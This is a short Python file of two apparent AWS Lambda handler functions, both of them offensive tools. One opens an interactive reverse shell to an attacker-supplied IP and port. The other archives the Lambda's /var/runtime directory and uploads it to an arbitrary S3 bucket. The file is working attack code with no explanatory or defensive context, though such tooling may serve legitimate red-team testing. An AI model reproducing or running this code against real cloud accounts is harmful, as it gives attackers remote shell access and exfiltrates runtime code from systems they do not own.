import socket
import subprocess
import os
import boto3

s3 = boto3.client('s3')

def shell(event, context):
    """
    Opens a reverse shell to a lambda.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((event["ip"], event["port"], ))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.call(["/bin/sh", "-i"])


def download_code(event, context):
    """
    Download the runtime environment of a lambda to a given s3 bucket.
    """
    os.system("/bin/tar -zcvf /tmp/code.tar.gz /var/runtime/")
    with open("/tmp/code.tar.gz", "rb") as code:
        s3.upload_fileobj(code, event['bucket_name'], 'code.tar.gz')
